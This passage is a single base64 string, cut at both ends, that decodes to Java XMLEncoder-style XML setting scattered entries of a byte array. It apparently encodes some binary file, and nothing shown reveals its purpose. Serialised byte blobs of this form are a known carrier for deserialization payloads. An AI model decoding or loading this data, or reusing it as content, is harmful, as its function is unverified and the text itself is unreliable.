ZvaWQ+PHZvaWQgaW5kZXg9IjMwMjEiPjxieXRlPjExMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQyMTMiPjxieXRlPjcxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjY0NiI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjQyNyI+PGJ5dGU+MTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NjE5Ij48Ynl0ZT42PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzI2MSI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MzQ2Ij48Ynl0ZT4yPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjc4OCI+PGJ5dGU+NDk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MjU0Ij48Ynl0ZT4xMTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0ODc5Ij48Ynl0ZT45OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ0NjciPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQwNzUiPjxieXRlPjcxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzMwMSI+PGJ5dGU+Nzc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNDI3Ij48Ynl0ZT4xMDk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NjA5Ij48Ynl0ZT40NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI2OTciPjxieXRlPjEyMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUyMCI+PGJ5dGU+Njg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NjA4Ij48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTc5MSI+PGJ5dGU+MTAzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTEzIj48Ynl0ZT4xMTQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzODY4Ij48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxODU4Ij48Ynl0ZT4xMTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NTQ5Ij48Ynl0ZT4tNzM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNDIzIj48Ynl0ZT4xMjE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NDE0Ij48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MjQ4Ij48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NTUiPjxieXRlPjE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMzQ5Ij48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MTA5Ij48Ynl0ZT45ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY4MTEiPjxieXRlPjEyNjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQzNDMiPjxieXRlPjEyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDI3MSI+PGJ5dGU+Njg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MjA0Ij48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzA0OCI+PGJ5dGU+NzA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MTQiPjxieXRlPjExNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIyMTIiPjxieXRlPjk5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTExNCI+PGJ5dGU+MTE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjg1Ij48Ynl0ZT40NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIwMjciPjxieXRlPjgxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDM0Ij48Ynl0ZT4zPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTAzNCI+PGJ5dGU+NzY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzODM5Ij48Ynl0ZT43NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjcxMiI+PGJ5dGU+MTA5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjA4NCI+PGJ5dGU+NzQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNTE3Ij48Ynl0ZT44NDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE0MzciPjxieXRlPjExNjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE0NCI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NzYyIj48Ynl0ZT45OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijc4MyI+PGJ5dGU+MTIwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iOTE2Ij48Ynl0ZT40NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI0NiI+PGJ5dGU+MTExPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzM3Ij48Ynl0ZT4xMDM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMjIwIj48Ynl0ZT41OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ4MDAiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIxNCI+PGJ5dGU+MTA0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDM1NCI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjg5NiI+PGJ5dGU+MTE5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDU4MCI+PGJ5dGU+MTEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDM5OCI+PGJ5dGU+MTA5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDkzNyI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDk1MyI+PGJ5dGU+MTEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjYxMSI+PGJ5dGU+ODg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI5MDMiPjxieXRlPjkxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTgyNiI+PGJ5dGU+NTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNjkyIj48Ynl0ZT45OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI3MTMiPjxieXRlPjUyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTkwNSI+PGJ5dGU+NzE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NTM5Ij48Ynl0ZT44PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjg2NyI+PGJ5dGU+ODc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNzMwIj48Ynl0ZT4xMTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MTcyIj48Ynl0ZT4xMTQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMDE1Ij48Ynl0ZT44MzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI3MDMiPjxieXRlPjgxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzg4MCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMjcyIj48Ynl0ZT42OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYyMTYiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDk5NyI+PGJ5dGU+MTE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDk5MSI+PGJ5dGU+MTE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTU1MCI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTc4NiI+PGJ5dGU+NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE1NTciPjxieXRlPjk5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzUzMyI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjU3NCI+PGJ5dGU+MTAwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjc2Ij48Ynl0ZT4xMDM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NzY2Ij48Ynl0ZT43MzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE0NzYiPjxieXRlPjExNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY3MCI+PGJ5dGU+NTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1OTA2Ij48Ynl0ZT4tNzQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzOTQzIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUyMjUiPjxieXRlPjc5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTk5NSI+PGJ5dGU+MTI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1ODM4Ij48Ynl0ZT43NDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEyMDEiPjxieXRlPjEwMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM2MTYiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTM2OSI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTIyMyI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzc4OSI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxOTU4Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY1MjgiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIwNDciPjxieXRlPjg3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTMwMiI+PGJ5dGU+ODM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzODk0Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQyMTgiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTAwMCI+PGJ5dGU+MTE0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjEzNSI+PGJ5dGU+MTE5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTI2NiI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNTU0Ij48Ynl0ZT45ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM5MzAiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjc3MCI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NjUiPjxieXRlPjE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNDc5Ij48Ynl0ZT41MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQzMzQiPjxieXRlPjExMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMwOTgiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTcyIj48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyOTA3Ij48Ynl0ZT4xMDk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MTA4Ij48Ynl0ZT43PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTQ1NyI+PGJ5dGU+NTQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MjY4Ij48Ynl0ZT43OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQwMzUiPjxieXRlPjcwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDExMyI+PGJ5dGU+MTIyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDAwMiI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMTgwIj48Ynl0ZT41NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM0NCI+PGJ5dGU+NTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNzYwIj48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMTU0Ij48Ynl0ZT43NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU4NTgiPjxieXRlPjE4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjY3MiI+PGJ5dGU+NjY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNjAyIj48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iODM5Ij48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNjgyIj48Ynl0ZT44OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIzMiI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iOTI0Ij48Ynl0ZT4xMjA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNjczIj48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxODQzIj48Ynl0ZT41ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE2NyI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTY4NCI+PGJ5dGU+MTA3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTg3MCI+PGJ5dGU+NzE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NzI0Ij48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTg1NiI+PGJ5dGU+NTQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMTQ4Ij48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NDg3Ij48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NzI0Ij48Ynl0ZT4xNzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM5NjciPjxieXRlPjgxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTcwMCI+PGJ5dGU+MjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM4MDQiPjxieXRlPjcwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjUzNiI+PGJ5dGU+MTIxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjgzNSI+PGJ5dGU+MTExPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTM3OSI+PGJ5dGU+MTE0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iOTM5Ij48Ynl0ZT4xMTQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNzgyIj48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI3NzYiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzIxNSI+PGJ5dGU+NTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MzgwIj48Ynl0ZT4xMDU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxOTMzIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEyOTciPjxieXRlPjExNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMyMjkiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTkzNiI+PGJ5dGU+MTExPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjQ2OSI+PGJ5dGU+MTE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzU2MSI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMzU3Ij48Ynl0ZT4xMjE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0ODE4Ij48Ynl0ZT4xMDY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1ODg5Ij48Ynl0ZT4tNzQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMjI3Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ5ODkiPjxieXRlPjEwODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU1OCI+PGJ5dGU+NjI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyODU3Ij48Ynl0ZT44ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE3NDAiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE0MzUiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzA5NSI+PGJ5dGU+ODg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMzc3Ij48Ynl0ZT4xMTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNzUzIj48Ynl0ZT41NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM3MyI+PGJ5dGU+NTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MzAyIj48Ynl0ZT43PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjY1MCI+PGJ5dGU+LTExPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTI2NiI+PGJ5dGU+NDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNTcyIj48Ynl0ZT43ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYzIj48Ynl0ZT4tNzA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNDg2Ij48Ynl0ZT44OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQyODgiPjxieXRlPjQ3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjMxNCI+PGJ5dGU+NzE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MTcwIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI0MTkiPjxieXRlPjUxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTc2NyI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzI4OSI+PGJ5dGU+MTE4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTAyMCI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDUxNCI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTA1NCI+PGJ5dGU+MTIwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzY2MiI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI3ODkiPjxieXRlPjExNjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM2MjIiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjEyNCI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNTAzIj48Ynl0ZT43MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI5NDgiPjxieXRlPjc4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjU4MCI+PGJ5dGU+OTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MTg5Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM1NTgiPjxieXRlPjcxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzIzNSI+PGJ5dGU+NzE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNjg1Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEzMjUiPjxieXRlPjExODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY4MTQiPjxieXRlPjEyMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM5MTciPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTY2MiI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzM1NyI+PGJ5dGU+MTEzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjA2NyI+PGJ5dGU+NTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMSI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNzMyIj48Ynl0ZT45OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMyMDgiPjxieXRlPjQ5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzEzMCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NDcwIj48Ynl0ZT4xMTQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NjUwIj48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMTcxIj48Ynl0ZT4xMDk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2Njc2Ij48Ynl0ZT4xNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijg4NyI+PGJ5dGU+Nzc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNDgxIj48Ynl0ZT43NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjExNDMiPjxieXRlPjExMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjkxMSI+PGJ5dGU+MTEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjgzMiI+PGJ5dGU+NzA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMjE5Ij48Ynl0ZT41MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEwMjQiPjxieXRlPjEyMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQyMjMiPjxieXRlPjY2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDQwNSI+PGJ5dGU+NDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NjE1Ij48Ynl0ZT4xMDU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0ODAiPjxieXRlPi03MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEwODAiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUxODQiPjxieXRlPjEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjY1MCI+PGJ5dGU+ODk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMzk4Ij48Ynl0ZT4xMDQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNTE4Ij48Ynl0ZT45MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU3OCI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjYxOCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MzgyIj48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NjY0Ij48Ynl0ZT4xMDk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MDg5Ij48Ynl0ZT4xMjA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMTYxIj48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNzAwIj48Ynl0ZT4xMTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMTc0Ij48Ynl0ZT4xMTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NTg1Ij48Ynl0ZT45NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMyMDMiPjxieXRlPjg3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjE1NiI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMTYwIj48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI3MjIiPjxieXRlPjExNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI3OTkiPjxieXRlPjY2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjU1NyI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMjc4Ij48Ynl0ZT44OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQxNyI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDc2NSI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDQwMSI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDk1NiI+PGJ5dGU+NDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxOTc1Ij48Ynl0ZT4xMTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MjY0Ij48Ynl0ZT40ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQxNSI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjQ2NiI+PGJ5dGU+MTA5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTYzIj48Ynl0ZT43MzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI3NzkiPjxieXRlPjg4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iODMzIj48Ynl0ZT4xMDA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNTk3Ij48Ynl0ZT42NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE1MjQiPjxieXRlPjExMjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE4MTQiPjxieXRlPjQ3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzUzMSI+PGJ5dGU+ODc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MDYxIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU2NzEiPjxieXRlPjE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNzQzIj48Ynl0ZT45NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMxMTkiPjxieXRlPjQ5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzU1MCI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MDUyIj48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMzE4Ij48Ynl0ZT41NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ0NDkiPjxieXRlPjExNzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY1MjMiPjxieXRlPjQ2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTY0OCI+PGJ5dGU+MTExPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iODcyIj48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNTQiPjxieXRlPjEwNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE0OTIiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTE5Ij48Ynl0ZT4xMDU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMTAxIj48Ynl0ZT44NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU0NzMiPjxieXRlPjQ